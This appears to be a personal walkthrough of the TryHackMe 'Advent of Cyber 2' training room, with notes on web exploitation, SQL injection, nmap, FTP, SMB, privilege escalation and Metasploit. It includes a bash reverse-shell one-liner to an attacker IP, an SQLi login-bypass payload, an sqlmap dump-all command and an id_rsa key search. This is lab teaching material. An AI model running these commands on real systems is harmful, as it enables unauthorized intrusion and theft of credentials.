<h1 align="center">Advent of Cyber 2</h1>

<p>This is a write-up/walkthrough for AoC 2020 room.</p>

# Days
|[1](#a-christmas-crisis)|[2](#the-elf-strikes-back!)|[3](#christmas-chaos)|[4](#santa's-watching)|[5](#someone-stole-santa's-gift-list!)|
|:-:|:-:|:-:|:-:|:-:|:-:|
|[6](#be-careful-with-what-you-wish-on-a-christmas-night)|[7](#the-grinch-really-did-steal-christmas)|[8](#what's-under-the-christmas-tree?)|[9](#anyone-can-be-santa)|[10](#don't-be-so-selfish)|
|[11](#the-rogue-gnome)|[12](#ready,-set,-elf)|[13](#)|[14](#)|[15](#)|

# A Christmas Crisis
## Topic and concepts
Web exploitation, Web, HTTPS, Cookies.<br>
* Finding cookies name in Developer Tools
* Recognizing data formats
* Creating hexadecimal data
* JSON
## Ressources
[Cyberchef](https://gchq.github.io/CyberChef/): Decoding strings

# The Elf Strikes Back!
## Topic and concepts
Web exploitation, GET parameters and URLs, File uploads, Reverse shells, Reverse 
shells listeners.<br>
* Bypassing file upload filters
* Uploading reverse shells
* Finding uploaded files directories
* `Netcat`
## Ressources
[php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php): 
PHP reverse shell script found in Kali Linux

# Christmas Chaos
## Topic and concepts
Authentication, Default credentials, Dictionary attacks with `BurpSuite`.<br>
* Intercepting traffic
* Automating customize web attacks
* Brute forcing a login form
* `BurpSuite` Community
* Payloads
## Ressources
[SecLists](https://github.com/danielmiessler/SecLists/): Collection of common 
lists including usernames, passwords, URLs and so on.

# Santa's watching
## Topic and concepts
Fuzzing, `gobuster` use, `wfuzz` use.<br>
* API
* Enumerating a web server for hidden files
* Enumerating a web server for hidden folders
* Error conditions
* Fuzzing datestamps
* Finding the specific name of a directory
* Fuzzing with GET parameters
* Using `gobuster` with directories
* Wordlists
## Ressources
[gobuster](https://github.com/OJ/gobuster): GitHub webpage<br>
[gobuster man](http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html): 
man page of ``gobuster``<br>
`/usr/share/wordlists`: Default location for wordlists on Kali Linux<br>
[wfuzz](https://github.com/xmendez/wfuzz): GitHub webpage<br>
[wfuzz man](https://github.com/xmendez/wfuzz): man page of `wfuzz`<br>
[AoC-Advent2020](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist): 
Advent of Cyber wordlist (containg among other things YYYYDDMM datestamps)<br>

# Someone stole Santa's gift list! 
## Topic and concepts
SQL injection, Login bypass with SQL injection, Blind SQL injection, Union SQL 
injection, `SQLMap`, `SQLMap` & `BurpSuite`.<br>
* Dumping a file
* Possibilities of a SQL injection
* Main SQL injection commands
* 1=1
* Common comments for SQLi payloads
* Different SQL login queries
* Yes or No questions to the database
* `SUBSTR()` SQL function
* Payloads with SQL injections
* Database enumeration
* Stages of an UNION SQLi attack
* `ORDER BY` queries
* Determining the number of columns required in a SQLi UNION attack
* `UNION SELECT`
* Meaning of no error when determining number of columns
* Finding columns with useful data in SQLi UNION attack
* `UNION SELECT` payloads
* Meaning of no error when finding useful data type
* Retrieving interesting data with SQLi UNION attack
* Common options for `SQLMap`
* WAF
## Walkthrough
Bypass the login: insert
```
username: )' or true; --
```
in the field.<br>
Find 
* the number of entries
* what Paul asked for
* the flag
* the admin password
```
python sqlmap.py -r ./request --dbms=sqlite --tamper=space2comment --dump-all
```
## Ressources
[SQL commands](https://www.codecademy.com/articles/sql-commands): List of SQL 
commands<br>
`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev` : 
`SQLMap` installation<br>
[SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection): 
SQL injection cheatsheet<br>
[SQL injection payloads list](https://github.com/payloadbox/sql-injection-payload-list): 
Payloads list

# Be careful with what you wish on a Christmas night 
## Topic and concepts
XSS, Detection, Mitigation.<br>
* Cross-site Scripting
* Types of XSS attacks
* OWASP ZAP
## Ressources
[XSS mitigation](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md): 
OWASP's guide towards mitigating XSS attacks

# The Grinch Really Did Steal Christmas
## Topic and concepts
IP address, Protocols 101, Three-way handshake, TCP reassembling data, 
Network traffic monitor.<br>
* TCP/IP
* PCAPs
* Basic `Wireshark` filtering
* HTTP
* SMB
* NATting
* UDP/IP
* Routing
* SYN
* ACK
* `Wireshark`
* `Wireshark` filters
* Filter operators
* Data exportation from `Wireshark`
* Filter to see HTTP GET requests
## Walkthrough
Filter to identify the IP address initiating a specific protocol:<br>
`icmp`<br>
Filter to get the name of an article an IP address visited:<br>
`http.request.method == GET`<br>
Filter to see a leaked password during the login process with FTP traffic:<br>
`ftp.request` <br>
Identify encrypted protocol
```
open pcap file
take a look the list of info provided
```
Identify an item on a list:
```
http.request.method == GET
Export Objects HTTP
Save selected object
Open local file
```
## Ressources
[NATting](https://techterms.com/definition/nat): NATting explanation

# What's Under the Christmas Tree?
## Topic and concepts
Nmap, Basic functionalities, Timing templates, NSE, Additional scan types, 
Scans defense.<br>
* Finding port numbers of services running on a IP address
* Determining if the host is up
* Determining the distro running
* Retrieveing the `HTTP-TITLE` of a server
* TCP scanning
* Three-way handshake
* Connect scan
* SYN scan
* Uses of NSE
* Performing OS detection
* IDS (Intrusion Detection)
* IPS (Prevention Systems)
* `Snort`
* `Suricata`
* `pfSense`
## Walkthrough
Provide a script with nmap:
```
--script <name-of-the-script>
```
Perform a SYN scan:
```
-sS <ip>
```
Performe a connect scan:
```
-sT <ip>
```
Determine nmap's performance:
```
-T<number>
```
with `number ε [0, 5]`<br>
Identify services running on a server:
```
-A
```
Retrieve the OS:
```
-O
```
Scan a specific port:
```
-p <port-number>
```
Scan a specific range of ports:
```
-p <lower-range>-<upper-range>
```
Scan all ports:
```
-p-
```
Scan using TCP and performing version fingerprinting:
```
-p-
```
## Ressources
[NSE Doc Reference Portal](https://nmap.org/nsedoc/): List of NSE scripts<br>
[The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page): 
Penetration testing methodology<br>

# Anyone can be Santa
## Topic and concepts
FTP, No credentials, FTP over terminal, Exploit search.<br>
* `FileZilla`
* FTP servers
* FTP Connections
* Connection ports
* Anonymous mode
## Walkthrough
Access a FTP server:
```
ftp <ip>
```
Check if anonymous mode is enabled: typing
```
anonymous
```
when prompted for the name.<br>
Download a file from FTP server to the local device:
```
get
```
Upload a file from the local device to FTP server
```
put
```
Generat a shell :
```
bash -i >& /dev/tcp/<my-ip-address>/4444 0>&1
```
4444 being a trivial port number.<br>
Catch the connection to get reverse shell:
```
nc -lvnp 4444
```
## Ressources
[PayloadsAllTheThings/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp): 
Pentesterts cheatsheet<br>

# Don't be so sElfish
## Topic and concepts
Network file sharing protocols, Samba, Shares search, Share connection.<br>
* File sharing protocols used by organisations/company networks
* SMB (Server Message Block)
* NFS (Network File System)
* Share
* Difference between Samba and FTP
* `enum4linux`
* `smbclient`
* Accessing a share with wrong permissions
* Count the number of users on a Samba server
* Count the number of shares
* Identifying a share not requiring a password
## Walkthrough
List all `enum4linux` options:
```
./enum4linux.pl -h
```
List shares:
```
-U
```
List shares:
```
-S
```
Access a Samba server and its shares:
```
smbclient //<instance-ip-address>/<share>
```
Download a file from a share:
```
get
```
Upload a file to a share:
```
put
```
## Ressources
[CiscoCXSecurity/enum4linux](https://github.com/CiscoCXSecurity/enum4linux): 
Tool installation page<br>

# The Rogue Gnome
## Topic and concepts
Privilege escalation, Directions, Reinforcing the breach, Enumerations with 
nmap, Checklist, SUID, GTFOBins, Enumeration scripts, Covering 
tracks.<br>
* Levels of permissions
* Horizontal privilege escalation
* Vertical privilege escalation
* Instability
* DVWA (Damn Vulnerable Web Application)
* Command injection
* Difference between `/bin/bash` and `/bin/sh`
* LinEnum
* Enumeration possibilities of LinEnum
* Running an enumerating script
## Walkthrough and commands
Make shell interactive:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Displqy current shell:
```
echo $0
```
Find file containing ssh keys:
```
find / -name id_rsa 2> /dev/null
```
Priv Esc checklist:
```
1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
3. Looking for automated scripts like backup scripts (exploiting crontabs)
4. Credentials (user accounts, application config files..)
5. Mis-configured file and directory permissions
```
Directory with sudoers:
<br>`/etc/sudoer`<br>
Turn the machine into a web server:
```
python3 -m http.server 8080
```
Listen to incoming files:
```
nc -l -p 1337 > LinEnum.sh
```
Send a file to vlnerable instance:
```
nc -w -3 MACHINE_IP 1337 < LinEnum.sh
```
Add execution permissions on vulnerable instance:
```
chmod +x LinEnum.sh
```
Logs of ssh key:
<br>`/var/log/auth.log`<br>
Logs of system events:
<br>`/var/log/syslog`<br>
Logs for a specific service:
<br>`/var/log/<service/`<br>
## Ressources
[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation): 
Checklist for Linux<br>
[Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys): 
Tips to make a shell more interactive<br>
[GTFOBins](https://gtfobins.github.io/): 
Website listing executables able to bypass local security restrictions in misconfigured systems<br>
[LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh): 
Tool enumerating a machine<br>

# Ready, set, elf
## Topic and concepts
Version numbering, CGI, Abuse, `Metasploit`.<br>
* Information disclosure
* URL encoding
* Shellshock attack
* Data required by `Metasploit`
* LHOST
* RHOST(S)
* TARGETURI
* Checking if options are set correctly
* `Meterpreter`
* Finding the version number of a web server
* Finding CVE to create a `Meterpreter`
## Walkthrough
Folder containing CGIs on a webserver:
<br>`/cgi-bin/`<br>
Parse a command on a URL:
```
<URL>?&<command-to-parse>
```
`Windows` command to reveal information about the system:
```
systeminfo
```
Launch `Metasploit`:
```
msfconsole
```
List `Metasploit`'s required settings:
```
options
```
Set value to a `Metasploit` setting:
```
set <OPTION> <VALUE>
```
Run an exploit on `Metasploit`:
```
run
```
Run commands on a host on `Meterpreter`:
```
shell
```
## Ressources
[Rapid7](http://rapid7.com/): Knowledge base for vulnerabities<br>
[AttackerKB](https://attackerkb.com/): Knowledge base for vulnerabities<br>
[MITRE](https://cve.mitre.org/cve/): Knowledge base for vulnerabities<br>
[Exploit-DB](http://exploit-db.com/): Knowledge base for vulnerabities<br>
[What is URL Encoding?](https://www.techopedia.com/definition/10346/url-encoding): URL encoding explanation<br>
[Shellshock In-Depth](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/): Shellshock attack explanation<br>
[`Metasploit`: Basics](https://blog.tryhackme.com/metasploit/): TryHackMe's explanation of `Metasploit` in-depth<br>

# 
## Topic and concepts
.<br>
* 
## Walkthrough
:
```

```
## Ressources
[](): <br>